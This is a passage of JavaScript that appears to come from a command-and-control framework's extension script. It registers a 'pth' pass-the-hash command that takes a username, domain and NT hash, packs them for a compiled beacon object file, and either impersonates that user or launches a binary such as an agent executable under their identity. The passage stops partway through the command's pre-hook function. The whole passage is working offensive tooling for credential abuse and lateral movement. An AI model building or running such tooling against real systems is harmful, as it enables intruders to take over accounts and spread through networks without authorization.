...
// pth — Pass-the-Hash: mint a token from an NT hash (LsaLogonUser + MSV1_0_LM20_LOGON
// + NTLMv2-from-hash, no lsass write) and either impersonate the beacon as that user
// (no binary) or spawn a binary as that user (network logon). MITRE T1550.002.
var cmd_pth = ax.create_command("pth", "Pass-the-Hash: make a token from an NT hash and optionally run a binary as that user (no lsass patching)", "pth svc-sql DEV 31d6cfe0d16ae931b73c59d7e0c089c0 C:\\Windows\\Temp\\agent.exe");
cmd_pth.addArgString("username", true, "Username");
cmd_pth.addArgString("domain", true, "Domain (use '.' or computer name for local accounts)");
cmd_pth.addArgString("nthash", true, "NT hash (32 hex) or lm:nth form");
cmd_pth.addArgString("binary", false, "Optional binary to run as the user; omit to impersonate the beacon as that user");
cmd_pth.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    if (ax.isadmin(id) == false) { throw new Error("You need to be admin to run pth (SeImpersonate for token use)"); }

    let username = parsed_json["username"];
    let domain   = parsed_json["domain"];
    let nthash   = parsed_json["nthash"];
    let binary   = parsed_json["binary"] || "";

    let bof_params = ax.bof_pack("wstr,wstr,cstr,wstr", [username, domain, nthash, binary]);
    let bof_path = ax.script_dir() + "_bin/pth." + ax.arch(id) + ".o";
    let message = binary
        ? `Task: pth run ${binary} as ${domain}\\${username} (hash)`
        : `Task: pth impersonate ${domain}\\${username} (hash)`;
